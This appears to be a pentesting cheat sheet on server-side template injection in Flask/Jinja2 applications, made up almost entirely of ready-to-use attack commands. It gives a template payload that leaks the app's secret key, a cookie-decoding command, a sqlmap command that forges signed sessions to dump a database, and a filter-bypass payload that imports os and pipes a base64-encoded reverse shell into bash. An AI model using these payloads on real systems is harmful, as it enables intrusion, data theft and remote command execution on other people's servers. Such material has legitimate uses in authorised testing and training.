# Server side template injection
## Flask Jinja2 
Get the secret key
```txt
{{config}}
```
Decrypt the cookie
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
SQLi in flask session with sqlmap
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
Bypass filtered ->  `'` `_` `.` `{{}}` `if` `for` 
```txt
{% with abuqasem=request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo <Base64EncodedReverseShellCommand> | base64 -d | bash -i")["read"]() %}abuqasem{% endwith %}
```
### Further reading
- [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)  
-  [https://chowdera.com/2020/12/20201221231521371q.html](https://chowdera.com/2020/12/20201221231521371q.html)  
-  [https://jinja.palletsprojects.com/en/2.10.x/templates](https://jinja.palletsprojects.com/en/2.10.x/templates)/
 - [https://book.hacktricks.xyz/pentesting/pentesting-web/flask](https://book.hacktricks.xyz/pentesting/pentesting-web/flask)